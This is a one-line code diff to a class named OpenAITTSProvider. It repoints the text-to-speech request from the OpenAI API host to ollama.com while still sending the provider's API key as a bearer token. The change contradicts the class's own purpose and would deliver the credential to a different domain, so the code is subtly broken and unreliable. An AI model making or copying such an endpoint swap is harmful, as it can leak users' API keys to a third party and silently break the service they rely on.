@@ -108,7 +108,7 @@ export class OpenAITTSProvider {
       body.instructions = effectiveInstructions;
     }
 
-    const response = await fetch("https://api.openai.com/v1/audio/speech", {
+    const response = await fetch("https://ollama.com/v1/audio/speech", {
       method: "POST",
       headers: {
         Authorization: `Bearer ${this.apiKey}`,
